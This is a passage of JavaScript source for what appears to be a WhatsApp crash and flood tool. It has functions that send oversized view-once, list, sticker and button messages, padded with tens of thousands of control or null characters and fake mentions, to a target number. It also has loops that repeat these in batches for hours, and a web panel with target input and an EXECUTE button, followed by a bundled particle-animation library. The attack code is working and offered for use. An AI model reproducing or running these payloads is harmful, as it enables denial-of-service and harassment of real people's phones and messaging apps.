4L8kBTi4SjODalFpp9TM9WrxJZPJv79XdZVEsJG8mP5lXtNf8AafINZnxr/ez7q8iBOpUuLidavJzqzespPpZVevGokka9S1KneQUYJrD7x9IdqR4cBupmPIRTIsITFjIs6HnJh6J8z3cR4mGmIvJ8qa6g1SR4mMi9RFJpnsYJDYpIBBpgWg1FNHygj5MNMBnygg4wXUeIJMQxkYoNICLDTApBKKGR4C0wkwDoOiw0+AmLGJiLTKWmHFiU9GGmdTzsjosNMTFhpiKTHJhJikw0xFDosNMQmMiwOkZDkw4sSmGmItDkwkxUWGmAxiYyLEphJgA9MJMVGQaYihiYaYpMJMAKcnqep6MCIZ0MbWQ0w0xK5hoCUxyYaYmIaYikxyYSYpcxgih0WEmJXMYmI6RY1MOLEoNAWOTCTFRfHQNAMYmMjIUEgAcmFqKiw0xFH//Z",
      thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
      thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
      thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
      mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
      mediaKeyTimestamp: "1743101489",
      thumbnailHeight: 641,
      thumbnailWidth: 640,
      inviteLinkGroupTypeV2: "DEFAULT",
      contextInfo: {
        quotedAd: {
          advertiserName: "x",
          mediaType: "IMAGE",
          jpegThumbnail: "",
          caption: "x"
        },
        placeholderKey: {
          remoteJid: "0@s.whatsapp.net",
          fromMe: false,
          id: "ABCDEF1234567890"
        }
      }
    }

    const msg = generateWAMessageFromContent(X, {
      viewOnceMessage: {
        message: { extendedTextMessage }
      }
    }, {});

    await Ren.relayMessage('status@broadcast', msg.message, {
      messageId: msg.key.id,
      statusJidList: [X],
      additionalNodes: [{
        tag: 'meta',
        attrs: {},
        content: [{
          tag: 'mentioned_users',
          attrs: {},
          content: [{
            tag: 'to',
            attrs: { jid: X },
            content: undefined
          }]
        }]
      }]
    });
  } catch (err) {
    console.error(err);
  }
};

async function ViewOnceXtended(target) {
  const MSG = {
    viewOnceMessage: {
      message: {
        extendedTextMessage: {
          text: "\u0007".repeat(30000),
          previewType: "ꦽ".repeat(10200),
          contextInfo: {
            mentionedJid: [
              target,
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 30000 },
                () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            forwardingScore: 1,
            isForwarded: true,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
          },
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, MSG, {});

  await Ren.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });

  await Ren.relayMessage(
    target,
    {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          }
        }
      }
    },
    {
      additionalNodes: [
        {
          tag: "meta",
          attrs: { is_status_mention: "𝐖𝐞𝐅𝐨𝐫𝐑𝐞̈𝐧𝐧̃ #🇧🇷" },
          content: undefined
        }
      ]
    }
  );
}

async function TrashProtocol(target, mention) {
  const sex = Array.from({ length: 9741 }, (_, r) => ({
    title: "꧀".repeat(9741),
    rows: [`{ title: ${r + 1}, id: ${r + 1} }`]
  }));

  const MSG = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "⟅̊༑ ▾𝐖𝐞𝐅𝐨𝐫𝐑𝐞̈𝐧𝐧̃ #🇧🇷 ༑ ▾",
          listType: 2,
          buttonText: null,
          sections: sex,
          singleSelectReply: { selectedRowId: "🇷🇺" },
          contextInfo: {
            mentionedJid: Array.from({ length: 9741 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "9741@newsletter",
              serverMessageId: 1,
              newsletterName: "-"
            }
          },
          description: "🇷🇺"
        }
      }
    },
    contextInfo: {
      channelMessage: true,
      statusAttributionType: 2
    }
  };

  const msg = generateWAMessageFromContent(target, MSG, {});

  await Ren.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });

  if (mention) {
    await Ren.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25
            }
          }
        }
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "⟅̊༑ ▾𝐖𝐞𝐅𝐨𝐫𝐑𝐞̈𝐧𝐧̃ #🇧🇷 ༑ ▾" },
            content: undefined
          }
        ]
      }
    );
  }
}

async function StickerMassageNew(X) {
  let parse = true;
  let SID = "5e03e0&mms3";
  let key = "10000000_2012297619515179_5714769099548640934_n.enc";
  let type = `image/webp`;
  if (11 > 9) {
    parse = parse ? false : true;
  }

  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=${SID}=true`,
          fileSha256: "n9ndX1LfKXTrcnPBT8Kqa85x87TcH3BOaHWoeuJ+kKA=",
          fileEncSha256: "zUvWOK813xM/88E1fIvQjmSlMobiPfZQawtA9jg9r/o=",
          mediaKey: "ymysFCXHf94D5BBUiXdPZn8pepVf37zAb7rzqGzyzPg=",
          mimetype: type,
          directPath:
            "/v/t62.43144-24/10000000_2012297619515179_5714769099548640934_n.enc?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=5e03e0",
          fileLength: {
            low: Math.floor(Math.random() * 1000),
            high: 0,
            unsigned: true,
          },
          mediaKeyTimestamp: {
            low: Math.floor(Math.random() * 1700000000),
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            participant: X,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 1000 * 40,
                },
                () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: Math.floor(Math.random() * -20000000),
            high: 555,
            unsigned: parse,
          },
          isAvatar: parse,
          isAiSticker: parse,
          isLottie: parse,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(X, message, {});

  await Ren.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [X],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: X },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

async function DelayOld2(target, mention) {
  let msg = await generateWAMessageFromContent(target, {
    buttonsMessage: {
      text: "📟",
      contentText:
        "⟅ ༑ ▾𝐖𝐞𝐅𝐨𝐫𝐑𝐞̈𝐧𝐧̃ #🇧🇷⟅ ༑ ▾",
      footerText: "©𝟐𝟎𝟐𝟓 RenXopown ༑",
      buttons: [
        {
          buttonId: ".bugs",
          buttonText: {
            displayText: "🇷🇺" + "\u0000".repeat(800000),
          },
          type: 1,
        },
      ],
      headerType: 1,
    },
  }, {});

  await Ren.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
  if (mention) {
    await Ren.relayMessage(
      target,
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "⟅ ༑ ▾𝐖𝐞𝐅𝐨𝐫𝐑𝐞̈𝐧𝐧̃ #🇧🇷 ༑ ▾ " },
            content: undefined,
          },
        ],
      }
    );
  }
}



async function oldDelay(X, mention = true) {
  const delaymention = Array.from({ length: 30000 }, (_, r) => ({
    title: "᭡꧈".repeat(95000),
    rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
  }));

  const MSG = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "𝐖𝐞𝐅𝐨𝐫𝐑𝐞̈𝐧𝐧̃ #🇧🇷༑⃟⃟🎭",
          listType: 2,
          buttonText: null,
          sections: delaymention,
          singleSelectReply: { selectedRowId: "🔴" },
          contextInfo: {
            mentionedJid: Array.from({ length: 30000 }, () =>
              "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
            ),
            participant: X,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "333333333333@newsletter",
              serverMessageId: 1,
              newsletterName: "-"
            }
          },
          description: "𝐖𝐞𝐅𝐨𝐫𝐑𝐞̈𝐧𝐧̃ #🇧🇷༑⃟⃟🎭"
        }
      }
    },
    contextInfo: {
      channelMessage: true,
      statusAttributionType: 2
    }
  };

  const msg = generateWAMessageFromContent(X, MSG, {});

  await Ren.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [X],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: X },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });

  if (mention) {
    await Ren.relayMessage(
      X,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25
            }
          }
        }
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "𝐖𝐞𝐅𝐨𝐫𝐑𝐞̈𝐧𝐧̃ #🇧🇷" },
            content: undefined
          }
        ]
      }
    );
  }
  console.log(chalk.bold.red('SUCCES SEND CRASH'));
}

async function GetSuZoXAndros(durationHours, X) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✅ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 1000) {
        await Promise.all([
          BlankPack(X),
          framersbug1(X),
          framersbug1(X),
          boegProtocol(X),
          SixDelay(X),
          SixDelay(X),
          NewBoeg(X),
          NewBoeg(X),
          boegProtocol(X),
          boegProtocol(X),
          restart(X)
        ]);
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/1000 Andros 📟
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 700);
      } else {
        console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( Grade Matrix 🍂 777 ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 5 * 60 * 1000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 700);
    }
  };
  sendNext();
}

// ---------------------------------------------------------------------------\\
async function iosflood(durationHours, X) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✅ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 1000) {
        await Promise.all([
          BlankPack(X),
          framersbug1(X),
          framersbug1(X),
          boegProtocol(X),
          SixDelay(X),
          SixDelay(X),
          NewBoeg(X),
          NewBoeg(X),
          boegProtocol(X),
          boegProtocol(X),
          restart(X)
        ]);
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/1000 DELAY IOS🕊️
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 700);
      } else {
        console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( Grade NECRO 🍂 777 ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 5 * 60 * 1000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 700);
    }
  };
  sendNext();
}

const executionPage = (
  status = "🟪 Ready",
  detail = {},
  isForm = true,
  userInfo = {},
  message = "",
  mode = ""
) => {
  const { username, expired } = userInfo;
  const formattedTime = expired
    ? new Date(expired).toLocaleString("id-ID", {
      timeZone: "Asia/Jakarta",
      year: "2-digit",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
    })
    : "-";

  return `<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>NECRO-APi</title>
  <link href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
  <script src="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
 <style>
 * { box-sizing: border-box; margin: 0; padding: 0; }
body {
  font-family: 'Poppins', sans-serif;
  background: #000;
  color: white;
  min-height: 100vh;
  display: flex;
  justify-content: center;
  align-items: center;
  padding: 20px;
  overflow: hidden;
  position: relative;
}

#webcoderskull {
  position: absolute;
  left: 0;
  top: 53%;
  transform: translateY(-50%);
  padding: 0 20px;
  width: 100%;
  text-align: center;
}

canvas {
  height: 100vh;
  background-color: rgba(0, 0, 0, 0.75);
}

#webcoderskull h1 {
  letter-spacing: 5px;
  font-size: 5rem;
  font-family: 'Roboto', sans-serif;
  text-transform: uppercase;
  font-weight: bold;
}

.container {
  z-index: 1;
  background: rgba(0, 0, 0, 0.75);
  border: 1px solid #ff3d3d;
  padding: 24px;
  border-radius: 20px;
  max-width: 420px;
  width: 100%;
  box-shadow: 0 0 20px #ff3d3d, 0 0 40px #ff450033;
  backdrop-filter: blur(10px);
  position: relative;
}

.logo {
  width: 80px;
  height: 80px;
  margin: 0 auto 12px;
  display: block;
  border-radius: 50%;
  box-shadow: 0 0 16px #ff3d3d;
  object-fit: cover;
}

.username {
  font-size: 22px;
  color: #ffffff;
  font-weight: 600;
  text-align: center;
  margin-bottom: 6px;
}

.connected {
  font-size: 14px;
  color: #ff3d3d;
  margin-bottom: 16px;
  display: flex;
  justify-content: center;
  align-items: center;
}

.connected::before {
  content: '';
  width: 10px;
  height: 10px;
  background: #ff3d3d;
  border-radius: 50%;
  display: inline-block;
  margin-right: 8px;
}

input[type="text"] {
  width: 100%;
  padding: 14px;
  border-radius: 10px;
  background: #1a0000;
  border: none;
  color: white;
  margin-bottom: 16px;
}

.buttons-grid {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 12px;
  margin-bottom: 16px;
}

.buttons-grid button {
  padding: 2px;
  border: none;
  border-radius: 15px;
  background: #330000;
  color: #ff3d3d;
  font-weight: bold;
  cursor: pointer;
  transition: 0.3s;
}

.buttons-grid button.selected {
  background: #ff3d3d;
  color: #000;
}

.execute-button {
  background: #ff3d3d;
  color: #fff;
  padding: 14px;
  width: 100%;
  border-radius: 10px;
  font-weight: bold;
  border: none;
  margin-bottom: 12px;
  cursor: pointer;
  transition: 0.3s;
}

.execute-button:disabled {
  background: #4d0000;
  cursor: not-allowed;
  opacity: 0.5;
}

.execute-button:hover:not(:disabled) {
  background: #ff6666;
}

.footer-action-container {
  display: flex;
  flex-wrap: wrap;
  justify-content: center;
  align-items: center;
  gap: 8px;
  margin-top: 20px;
}

.footer-button {
  background: rgba(255, 0, 0, 0.15);
  border: 1px solid #ff3d3d;
  border-radius: 8px;
  padding: 8px 12px;
  font-size: 14px;
  color: #ff3d3d;
  display: flex;
  align-items: center;
  gap: 6px;
  transition: background 0.3s ease;
}

.footer-button:hover {
  background: rgba(139, 0, 0, 0.3);
}

.footer-button a {
  text-decoration: none;
  color: #ff3d3d;
  display: flex;
  align-items: center;
  gap: 6px;
}

.buttons-grid {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
  gap: 12px;
  margin-top: 20px;
}

.mode-btn {
  font-size: 14px;
  font-weight: 600;
  padding: 12px 16px;
  background-color: #1a0000;
  color: #ffffff;
  border: 2px solid #ff3d3d33;
  border-radius: 10px;
  cursor: pointer;
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 8px;
  transition: background-color 0.2s ease, transform 0.2s ease;
}

.mode-btn i {
  font-size: 18px;
}

.mode-btn:hover {
  background-color: #330000;
  transform: scale(1.03);
}

.mode-btn.full {
  grid-column: span 2;
}

@media (max-width: 500px) {
  .mode-btn.full {
    grid-column: span 1;
  }
}
</style>
</head>
<body>
  <div id="particles">
  <div id="webcoderskull">
  <div class="container">
    <img src="img/necro.jpg" alt="Logo" class="logo" />
    <div class="username">Welcome, ${username || 'Anonymous'}</div>
    <div class="connected">CONNECTED</div>

    <input type="text" placeholder="Input target number (62xxxx)" />

    <div class="buttons-grid">
      <button class="mode-btn" data-mode="ios"><i class="fa fa-fire" aria-hidden="true"></i>ANDRO DELAY</button>
      <button class="mode-btn" data-mode="andros"><i class="fa fa-tint" aria-hidden="true"></i>iOS DELAY </button>
      <button class="mode-btn full" data-mode="fcios"><i class="fa fa-bolt" aria-hidden="true"></i>BLONDE VINTAGE</button>
    </div>

    <button class="execute-button" id="executeBtn" disabled><i class="fas fa-rocket"></i> EXECUTE</button>

    <div class="footer-action-container">
      <div class="footer-button developer">
        <a href="https://t.me/DEAFORT_REAL2" target="_blank">
          <i class="fab fa-telegram"></i> Developer
        </a>
      </div>
      <div class="footer-button logout">
        <a href="/logout">
          <i class="fas fa-sign-out-alt"></i> Logout
        </a>
      </div>
      <div class="footer-button user-info">
        <i class="fas fa-user"></i> ${username || 'Unknown'}
        &nbsp;|&nbsp;
        <i class="fas fa-hourglass-half"></i> ${formattedTime}
      </div>
    </div>
  </div>
</div>
  </div>
  <script> /*!
 * Particleground
 *
 */
 document.addEventListener('DOMContentLoaded', function () {
  particleground(document.getElementById('particles'), {
    dotColor: '#ffffffff',
    lineColor: '#e11010ff'
  });
  var intro = document.getElementById('intro');
  intro.style.marginTop = - intro.offsetHeight / 2 + 'px';
}, false);



;(function(window, document) {
  "use strict";
  var pluginName = 'particleground';

  function extend(out) {
    out = out || {};
    for (var i = 1; i < arguments.length; i++) {
      var obj = arguments[i];
      if (!obj) continue;
      for (var key in obj) {
        if (obj.hasOwnProperty(key)) {
          if (typeof obj[key] === 'object')
            deepExtend(out[key], obj[key]);
          else
            out[key] = obj[key];
        }
      }
    }
    return out;
  };

  var $ = window.jQuery;

  function Plugin(element, options) {
    var canvasSupport = !!document.createElement('canvas').getContext;
    var canvas;
    var ctx;
    var particles = [];
    var raf;
    var mouseX = 0;
    var mouseY = 0;
    var winW;
    var winH;
    var desktop = !navigator.userAgent.match(/(iPhone|iPod|iPad|Android|BlackBerry|BB10|mobi|tablet|opera mini|nexus 7)/i);
    var orientationSupport = !!window.DeviceOrientationEvent;
    var tiltX = 0;
    var pointerX;
    var pointerY;
    var tiltY = 0;
    var paused = false;

    options = extend({}, window[pluginName].defaults, options);

    /**
     * Init
     */
    function init() {
      if (!canvasSupport) { return; }

      //Create canvas
      canvas = document.createElement('canvas');
      canvas.className = 'pg-canvas';
      canvas.style.display = 'block';
      element.insertBefore(canvas, element.firstChild);
      ctx = canvas.getContext('2d');
      styleCanvas();

      // Create particles
      var numParticles = Math.round((canvas.width * canvas.height) / options.density);
      for (var i = 0; i < numParticles; i++) {
        var p = new Particle();
        p.setStackPos(i);
        particles.push(p);
      };

      window.addEventListener('resize', function() {
        resizeHandler();
      }, false);

      document.addEventListener('mousemove', function(e) {
        mouseX = e.pageX;
        mouseY = e.pageY;
      }, false);

      if (orientationSupport && !desktop) {
        window.addEventListener('deviceorientation', function () {
          // Contrain tilt range to [-30,30]
          tiltY = Math.min(Math.max(-event.beta, -30), 30);
          tiltX = Math.min(Math.max(-event.gamma, -30), 30);
        }, true);
      }

      draw();
      hook('onInit');
    }

    /**
     * Style the canvas
     */
    function styleCanvas() {
      canvas.width = element.offsetWidth;
      canvas.height = element.offsetHeight;
      ctx.fillStyle = options.dotColor;
      ctx.strokeStyle = options.lineColor;
      ctx.lineWidth = options.lineWidth;
    }

    /**
     * Draw particles
     */
    function draw() {
      if (!canvasSupport) { return; }

      winW = window.innerWidth;
      winH = window.innerHeight;

      // Wipe canvas
      ctx.clearRect(0, 0, canvas.width, canvas.height);

      // Update particle positions
      for (var i = 0; i < particles.length; i++) {
        particles[i].updatePosition();
      };
      // Draw particles
      for (var i = 0; i < particles.length; i++) {
        particles[i].draw();
      };

      // Call this function next time screen is redrawn
      if (!paused) {
        raf = requestAnimationFrame(draw);
      }
    }

    /**
     * Add/remove particles.
     */
    function resizeHandler() {
      // Resize the canvas
      styleCanvas();

      var elWidth = element.offsetWidth;
      var elHeight = element.offsetHeight;

      // Remove particles that are outside the canvas
      for (var i = particles.length - 1; i >= 0; i--) {
        if (particles[i].position.x > elWidth || particles[i].position.y > elHeight) {
          particles.splice(i, 1);
        }
      };

      // Adjust particle density
      var numParticles = Math.round((canvas.width * canvas.height) / options.density);
      if (numParticles > particles.length) {
        while (numParticles > particles.length) {
          var p = new Particle();
          particles.push(p);
        }
      } else if (numParticles < particles.length) {
        particles.splice(numParticles);
      }

      // Re-index particles
      for (i = particles.length - 1; i >= 0; i--) {
        particles[i].setStackPos(i);
      };
    }

    /**
     * Pause particle system
     */
    function pause() {
      paused = true;
    }

    /**
     * Start particle system
     */
    function start() {
      paused = false;
      draw();
    }

    /**
     * Particle
     */
    function Particle() {
      this.stackPos;
      this.active = true;
      this.layer = Math.ceil(Math.random() * 3);
      this.parallaxOffsetX = 0;
      this.parallaxOffsetY = 0;
      // Initial particle position
      this.position = {
        x: Math.ceil(Math.random() * canvas.width),
        y: Math.ceil(Math.random() * canvas.height)
      }
      // Random particle speed, within min and max values
      this.speed = {}
      switch (options.directionX) {
        case 'left':
          this.speed.x = +(-options.maxSpeedX + (Math.random() * options.maxSpeedX) - options.minSpeedX).toFixed(2);
          break;
        case 'right':
          this.speed.x = +((Math.random() * options.maxSpeedX) + options.minSpeedX).toFixed(2);
          break;
        default:
          this.speed.x = +((-options.maxSpeedX / 2) + (Math.random() * options.maxSpeedX)).toFixed(2);
          this.speed.x += this.speed.x > 0 ? options.minSpeedX : -options.minSpeedX;
          break;
      }
      switch (options.directionY) {
        case 'up':
          this.speed.y = +(-options.maxSpeedY + (Math.random() * options.maxSpeedY) - options.minSpeedY).toFixed(2);
          break;
        case 'down':
          this.speed.y = +((Math.random() * options.maxSpeedY) + options.minSpeedY).toFixed(2);
          break;
        default:
          this.speed.y = +((-options.maxSpeedY / 2) + (Math.random() * options.maxSpeedY)).toFixed(2);
          this.speed.x += this.speed.y > 0 ? options.minSpeedY : -options.minSpeedY;
          break;
      }
    }

    /**
     * Draw particle
     */
    Particle.prototype.draw = function() {
  // === Titik Partikel ===
  ctx.save();
  ctx.shadowColor = '#ff1aee';      // Warna glow ungu
  ctx.shadowBlur = 8;               // Intensitas blur
  ctx.shadowOffsetX = 0;
  ctx.shadowOffsetY = 0;

  ctx.beginPath();
  ctx.arc(
    this.position.x + this.parallaxOffsetX,
    this.position.y + this.parallaxOffsetY,
    options.particleRadius / 2,
    0,
    Math.PI * 2,
    true
  );
  ctx.closePath();
  ctx.fill();
  ctx.restore();

  // === Garis Antar Partikel ===
  ctx.save();
  ctx.shadowColor = '#ff1aee';
  ctx.shadowBlur = 8;
  ctx.shadowOffsetX = 0;
  ctx.shadowOffsetY = 0;

  ctx.beginPath();
  for (var i = particles.length - 1; i > this.stackPos; i--) {
    var p2 = particles[i];

    // Hitung jarak antar titik (Pythagoras)
    var a = this.position.x - p2.position.x;
    var b = this.position.y - p2.position.y;
    var dist = Math.sqrt((a * a) + (b * b)).toFixed(2);

    if (dist < options.proximity) {
      ctx.moveTo(
        this.position.x + this.parallaxOffsetX,
        this.position.y + this.parallaxOffsetY
      );

      if (options.curvedLines) {
        ctx.quadraticCurveTo(
          Math.max(p2.position.x, p2.position.x),
          Math.min(p2.position.y, p2.position.y),
          p2.position.x + p2.parallaxOffsetX,
          p2.position.y + p2.parallaxOffsetY
        );
      } else {
        ctx.lineTo(
          p2.position.x + p2.parallaxOffsetX,
          p2.position.y + p2.parallaxOffsetY
        );
      }
    }
  }
  ctx.stroke();
  ctx.closePath();
  ctx.restore();
};


    /**
     * update particle position
     */
    Particle.prototype.updatePosition = function() {
      if (options.parallax) {
        if (orientationSupport && !desktop) {
          // Map tiltX range [-30,30] to range [0,winW]
          var ratioX = (winW - 0) / (30 - -30);
          pointerX = (tiltX - -30) * ratioX + 0;
          // Map tiltY range [-30,30] to range [0,winH]
          var ratioY = (winH - 0) / (30 - -30);
          pointerY = (tiltY - -30) * ratioY + 0;
        } else {
          pointerX = mouseX;
          pointerY = mouseY;
        }
        // Calculate parallax offsets
        this.parallaxTargX = (pointerX - (winW / 2)) / (options.parallaxMultiplier * this.layer);
        this.parallaxOffsetX += (this.parallaxTargX - this.parallaxOffsetX) / 10; // Easing equation
        this.parallaxTargY = (pointerY - (winH / 2)) / (options.parallaxMultiplier * this.layer);
        this.parallaxOffsetY += (this.parallaxTargY - this.parallaxOffsetY) / 10; // Easing equation
      }

      var elWidth = element.offsetWidth;
      var elHeight = element.offsetHeight;

      switch (options.directionX) {
        case 'left':
          if (this.position.x + this.speed.x + this.parallaxOffsetX < 0) {
            this.position.x = elWidth - this.parallaxOffsetX;
          }
          break;
        case 'right':
          if (this.position.x + this.speed.x + this.parallaxOffsetX > elWidth) {
            this.position.x = 0 - this.parallaxOffsetX;
          }
          break;
        default:
          // If particle has reached edge of canvas, reverse its direction
          if (this.position.x + this.speed.x + this.parallaxOffsetX > elWidth || this.position.x + this.speed.x + this.parallaxOffsetX < 0) {
            this.speed.x = -this.speed.x;
          }
          break;
      }

      switch (options.directionY) {
        case 'up':
          if (this.position.y + this.speed.y + this.parallaxOffsetY < 0) {
            this.position.y = elHeight - this.parallaxOffsetY;
          }
          break;
        case 'down':
          if (this.position.y + this.speed.y + this.parallaxOffsetY > elHeight) {
            this.position.y = 0 - this.parallaxOffsetY;
          }
          break;
        default:
          // If particle has reached edge of canvas, reverse its direction
          if (this.position.y + this.speed.y + this.parallaxOffsetY > elHeight || this.position.y + this.speed.y + this.parallaxOffsetY < 0) {
            this.speed.y = -this.speed.y;
          }
          break;
      }

      // Move particle
      this.position.x += this.speed.x;
      this.position.y += this.speed.y;
    }

    /**
     * Setter: particle stacking position
     */
    Particle.prototype.setStackPos = function(i) {
      this.stackPos = i;
    }

    function option (key, val) {
      if (val) {
        options[key] = val;
      } else {
        return options[key];
      }
    }

    function destroy() {
      console.log('destroy');
      canvas.parentNode.removeChild(canvas);
      hook('onDestroy');
      if ($) {
        $(element).removeData('plugin_' + pluginName);
      }
    }

    function hook(hookName) {
      if (options[hookName] !== undefined) {
        options[hookName].call(element);
      }
    }

    init();

    return {
      option: option,
      destroy: destroy,
      start: start,
      pause: pause
    };
  }

  window[pluginName] = function(elem, options) {
    return new Plugin(elem, options);
  };

  window[pluginName].defaults = {
    minSpeedX: 0.1,
    maxSpeedX: 0.7,
    minSpeedY: 0.1,
    maxSpeedY: 0.7,
    directionX: 'center', // 'center', 'left' or 'right'. 'center' = dots bounce off edges
    directionY: 'center', // 'center', 'up' or 'down'. 'center' = dots bounce off edges
    density: 10000, // How many particles will be generated: one particle every n pixels
    dotColor: '#666666',
    lineColor: '#666666',
    particleRadius: 7, // Dot size
    lineWidth: 1,
    curvedLines: false,
    proximity: 100, // How close two dots need to be before they join
    parallax: true,
    parallaxMultiplier: 5, // The lower the number, the more extreme the parallax effect
    onInit: function() {},
    onDestroy: function() {}
  };

  // nothing wrong with hooking into jQuery if it's there...
  if ($) {
    $.fn[pluginName] = function(options) {
      if (typeof arguments[0] === 'string') {
        var methodName = arguments[0];
        var args = Array.prototype.slice.call(arguments, 1);
